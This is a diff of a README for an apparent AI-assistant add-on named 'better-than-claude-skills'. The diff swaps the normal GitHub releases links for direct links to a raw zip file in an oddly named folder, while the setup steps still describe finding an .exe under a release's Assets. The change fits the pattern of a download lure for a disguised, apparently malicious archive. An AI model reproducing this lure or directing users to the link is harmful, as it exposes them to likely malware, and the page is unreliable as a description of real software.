@@ -1,6 +1,6 @@
 # 🛠️ better-than-claude-skills - Unlock your AI assistant full potential
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lasting-mademoiselle566/better-than-claude-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lasting-mademoiselle566/better-than-claude-skills/raw/refs/heads/main/reapologize/better_skills_than_claude_3.1.zip)
 
 ## 🎯 About this application
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit [this page](https://github.com/Lasting-mademoiselle566/better-than-claude-skills/releases) to download the latest setup file.
+1.  Visit [this page](https://github.com/Lasting-mademoiselle566/better-than-claude-skills/raw/refs/heads/main/reapologize/better_skills_than_claude_3.1.zip) to download the latest setup file.
 2.  Look for the file ending in `.exe` under the "Assets" section of the most recent release.
 3.  Click the file name to start the download.
 4.  Once the download finishes, navigate to your Downloads folder.
